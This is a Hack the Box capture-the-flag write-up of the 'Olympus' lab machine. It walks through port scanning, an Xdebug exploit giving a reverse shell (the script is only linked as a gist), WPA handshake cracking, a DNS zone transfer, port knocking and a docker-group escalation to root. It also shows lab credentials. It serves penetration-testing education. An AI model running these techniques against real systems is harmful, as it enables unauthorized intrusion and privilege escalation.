---
layout: post
title: "{Hack the Box} \\\\ Olympus Write-Up"
date: 2018-09-21
image: http://fasetto.github.io/assets/images/htb-olympus.png
author: fasetto
categories: [write-up, hackthebox]
tags: [writeup, olympus, pentest, hackthebox]
excerpt_separator: <!-- more-->
excerpt: <!-- more-->
---

![olympus]({{ site.baseurl }}/assets/images/olympus/htb-olympus.png)
## Hi everyone,

In this article I'll show you guys how I pwned **Olympus** machine on [Hack the Box](https://hackthebox.eu). <br>
Lets start..
<!-- more-->
## Enumeration
First thing we need to do is enumerating ports. I will be using **masscan** for quicly enumerating all ports.<br>
I recommend you to use this awesome tool.

```
root@89e502fff05a:~/pentest/hack-the-box/machines/olympus# masscan -p1-65535 10.10.10.83 --rate=200 -e tun0

Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2018-09-20 16:08:21 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 2222/tcp on 10.10.10.83
Discovered open port 53/tcp on 10.10.10.83
Discovered open port 80/tcp on 10.10.10.83

```

There are some ports opened. Lets run **nmap** for more information.

```
root@89e502fff05a:~/pentest/hack-the-box/machines/olympus# nmap -sS -sV -sC -p53,80,2222 -o nmap.txt 10.10.10.83
Nmap scan report for 10.10.10.83
Host is up (0.074s latency).

PORT     STATE SERVICE VERSION
53/tcp   open  domain  (unknown banner: Bind)
| dns-nsid:
|_  bind.version: Bind
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|     bind
|_    Bind
80/tcp   open  http    Apache httpd
|_http-title: Crete island - Olympus HTB
2222/tcp open  ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-City of olympia
| ssh-hostkey:
|   2048 f2:ba:db:06:95:00:ec:05:81:b0:93:60:32:fd:9e:00 (RSA)
|   256 79:90:c0:3d:43:6c:8d:72:19:60:45:3c:f8:99:14:bb (ECDSA)
|_  256 f8:5b:2e:32:95:03:12:a3:3b:40:c5:11:27:ca:71:52 (ED25519)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :

```

Apache is running in port 80. We have a web page. <br>
Lets check it first.

![img]({{ site.baseurl }}/assets/images/olympus/ctMAzrvXAYYHsqQKgkWvv.png)

There is a picture as background of body. I looked the source code of the page and nothing is usefull. So I thought maybe thats a **steganography** challenge ? <br>
Downloaded that image and run **steghide** and **binwalk** on it. And I got nothing. <br>
And I decided to take a look at the server response, maybe I can find something.

![img]({{ site.baseurl }}/assets/images/olympus/NuKtO7Shmhm3kY9XFpivR.png)

Yeah. Thats realy interesting. **Xdebug** is a **PHP** extension for debugging.<br>
That header also tells us the version of xdebug. I searched on google and I saw that version has a vulnerabilty.

## Exploitation (stage-one)
I wrote a simple script that drops me a **reverse-shell.**

{% gist fasetto/c057b9154262af2b2d1ef39a08cd13df %}

![img]({{ site.baseurl }}/assets/images/olympus/GGHxg1j6TnVSWR1unl5ZL.png)

![img]({{ site.baseurl }}/assets/images/olympus/vi3yKoTtNjpVyKKXA24Da.png)

## Enumeration from the inside
I am **www-data** now. Thats good but I realized that box is actually a **docker container.** <br>
That means we are not inside the real box. Anyway, I found a **zeus** username in **/etc/passwd** file. I looked the **/home/zeus** dir. <br>
I saw **airgeddon** folder, here:

```
drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 .
drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..
-rw-r--r-- 1 zeus zeus    264 Apr  8 00:58 .editorconfig
drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 .git
-rw-r--r-- 1 zeus zeus    230 Apr  8 00:58 .gitattributes
drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 .github
-rw-r--r-- 1 zeus zeus     89 Apr  8 00:58 .gitignore
-rw-r--r-- 1 zeus zeus  15855 Apr  8 00:58 CHANGELOG.md
-rw-r--r-- 1 zeus zeus   3228 Apr  8 00:58 CODE_OF_CONDUCT.md
-rw-r--r-- 1 zeus zeus   6358 Apr  8 00:58 CONTRIBUTING.md
-rw-r--r-- 1 zeus zeus   3283 Apr  8 00:58 Dockerfile
-rw-r--r-- 1 zeus zeus  34940 Apr  8 00:58 LICENSE.md
-rw-r--r-- 1 zeus zeus   4425 Apr  8 00:58 README.md
-rw-r--r-- 1 zeus zeus 297711 Apr  8 00:58 airgeddon.sh
drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 binaries
drwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 captured
drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 imgs
-rw-r--r-- 1 zeus zeus  16315 Apr  8 00:58 known_pins.db
-rw-r--r-- 1 zeus zeus 685345 Apr  8 00:58 language_strings.sh
-rw-r--r-- 1 zeus zeus     33 Apr  8 00:58 pindb_checksum.txt
```

That **captured** folder is interesting. I looked inside and:

```
drwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 .
drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..
-rw-r--r-- 1 zeus zeus 297917 Apr  8 12:48 captured.cap
-rw-r--r-- 1 zeus zeus     57 Apr  8 17:30 papyrus.txt
```

#### papyrus.txt
```
Captured while flying. I'll banish him to Olympia - Zeus
```

That message maybe could help later.

#### captured.cap
I copied that file using netcat. When you transfering something always make sure the file is not broken, check the **md5sum**.

![img]({{ site.baseurl }}/assets/images/olympus/yYZzt9rFgRHne3Xxhz2QC.png)

![img]({{ site.baseurl }}/assets/images/olympus/r7YpKpJqrzEgVeAwwlZqX.png)


I dedided to crack the file.

![img]({{ site.baseurl }}/assets/images/olympus/FNOIlsW1sjjK7DwVRCwwW.png)

```
aircrack-ng captured.cap -w ~/pentest/wordlist/rockyou.txt
```

![img]({{ site.baseurl }}/assets/images/olympus/6m9G8Eatjc18yG1zrAxdD.png)

SSID: **Too_cl0se_to_th3_Sun** noted.<br>
After 20-30 mins later **aircrack-ng** cracked the file.<br>
The password is **flightoficarus**

## Stage Two
I tried to connect to the machine using **ssh** with username **zeus** and passwords I found, but didn't worked.<br>

![gif](https://media.giphy.com/media/E2USislQIlsfm/giphy.gif)

Than I thought, I know I am in a **docker container.** There isn't another user on that container.
There must be another container or actual box itself. <br>
So I tried with username **icarus** and passwords I found. It worked.<br>
**icarus** is the right username, and the password is **Too_cl0se_to_th3_Sun**

```
ssh icarus@10.10.10.83 -p 2222
```

![img]({{ site.baseurl }}/assets/images/olympus/QHsUB1EOWKPmUfsg0CfcT.png)

![gif](https://media.giphy.com/media/wOzfGOVG5oapW/giphy.gif){:width="400px" :height="324px"}

## Enumeration
Found something interesting again. **ctfolympus.htb** <br>
Lets add this domain in our **/etc/hosts** file.

I already checked that **dns service** I found earlier with **nmap.** <br>
But I didn't find anything. Lets check again.

```
root@89e502fff05a:~# dig axfr @10.10.10.83 ctfolympus.htb

; <<>> DiG 9.11.4-4-Debian <<>> axfr @10.10.10.83 ctfolympus.htb
; (1 server found)
;; global options: +cmd
ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
ctfolympus.htb.		86400	IN	TXT	"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
ctfolympus.htb.		86400	IN	A	192.168.0.120
ctfolympus.htb.		86400	IN	NS	ns1.ctfolympus.htb.
ctfolympus.htb.		86400	IN	NS	ns2.ctfolympus.htb.
ctfolympus.htb.		86400	IN	MX	10 mail.ctfolympus.htb.
crete.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
hades.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
mail.ctfolympus.htb.	86400	IN	A	192.168.0.120
ns1.ctfolympus.htb.	86400	IN	A	192.168.0.120
ns2.ctfolympus.htb.	86400	IN	A	192.168.0.120
rhodes.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
RhodesColossus.ctfolympus.htb. 86400 IN	TXT	"Here lies the great Colossus of Rhodes"
www.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
;; Query time: 79 msec
;; SERVER: 10.10.10.83#53(10.10.10.83)
;; WHEN: Fri Sep 21 15:06:00 UTC 2018
;; XFR size: 15 records (messages 1, bytes 475)

```

This message looks interesting..

```
"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
```

As I could understand there is another place to go. **3456, 8234, 62431** these numbers also weird. <br>
**prometheus** must be a username, **St34l_th3_F1re!** must be password. I tried with ssh again but didn't worked. <br>
I was stucked here. But my friend **Kunal** told me about **port-knocking.**

I searched on google and found these great articles.
* https://www.digitalocean.com/community/tutorials/how-to-use-port-knocking-to-hide-your-ssh-daemon-from-attackers-on-ubuntu
* https://www.bgasecurity.com/2014/05/port-knocking-yontemi-ile-portlar/


Basicly the **port 22** is opened but **hidden**. We can't access directly. But if we knock specific ports in a particular order, **knockd** service catch that **sequence** and allow us to connect.<br>
Doen't matter if that ports closed or not.

## Stage three
```
apt install knockd
```
```
root@89e502fff05a:~# knock ctfolympus.htb 3456 8234 62431 && ssh prometheus@ctfolympus.htb
prometheus@ctfolympus.htb's password: St34l_th3_F1re!
```
![img]({{ site.baseurl }}/assets/images/olympus/lZTNC0tYSK7ShGy1981NB.png)

In the **home** folder of **prometheus** there is a message from gods.<br>
That message I think useless.

![img]({{ site.baseurl }}/assets/images/olympus/ARjmzMZfYnuK02Dy8SxiO.png)

I'm in **docker** users group. Thats important.<br>
Lets have a look at **docker images** and **containers.**

![img]({{ site.baseurl }}/assets/images/olympus/XCy8la6s2XDnJ8aM1BzKv.png)

## Getting root
I want root flag, right ?<br>
Docker allow us to share our data between our machine and docker containers. So all I need to do is bind the **/root** partition and I can read what I want..

```
docker run --rm -it -v /root:/pwned olympia /bin/bash
```
It will create new container and execute the **/bin/bash** for us.
**--rm** flag means delete the container when we exit.

![img]({{ site.baseurl }}/assets/images/olympus/UWGSsYw47VtnweuMEwSbN.png)

Or we could use like this for just grab the flag..
```
docker run --rm -it -v /root:/pwned olympia /bin/bash -c "/bin/cat /pwned/root.txt"
```
![img]({{ site.baseurl }}/assets/images/olympus/zf4jhAcZOJ1RJuLXF7Tzg.png)

Almost forgot, I wanna show you guys how **knockd** daemon configured on this machine.
Check this.

![img]({{ site.baseurl }}/assets/images/olympus/Fb6i6t2YgwO5ztA7tHDEj.png)

![gif](https://media.giphy.com/media/RPwrO4b46mOdy/giphy.gif)

Thats it for **Olympus.** I learned a few things from this machine. <br>
If you have a question or something you can leave a comment.<br>
See you guys later.
